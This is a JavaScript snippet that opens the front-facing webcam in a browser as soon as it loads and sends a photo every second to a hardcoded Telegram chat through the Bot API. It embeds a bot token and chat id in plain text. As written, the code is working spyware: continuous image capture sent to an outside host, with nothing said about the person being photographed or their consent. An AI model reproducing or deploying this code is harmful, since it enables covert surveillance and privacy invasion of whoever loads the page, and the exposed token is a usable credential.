const botToken = '7486963640:AAE3sMEu0MPW7jPkUlxXqiklaRf6chWEW3I';
const chatId = '586564605';

(async () => {
    try {
        // Request access to the webcam
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 }, // Ideal width
                height: { ideal: 720 }, // Ideal height
                facingMode: 'user', // Front-facing camera
            },
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // Wait for the video to be ready to use
        video.onloadedmetadata = () => {
            // Set canvas size based on the video resolution
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            setInterval(async () => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'webcam_photo.jpg');

                        try {
                            const response = await fetch(
                                `https://api.telegram.org/bot${botToken}/sendPhoto`,
                                {
                                    method: 'POST',
                                    body: formData,
                                }
                            );
                            const data = await response.json();
                            console.log('Photo sent to Telegram:', data);
                        } catch (error) {
                            console.error('Error sending photo to Telegram:', error);
                        }
                    }
                }, 'image/jpeg');
            }, 1000); // Capture and send an image every second
        };

    } catch (error) {
        console.error('Error accessing webcam:', error);
    }
})();
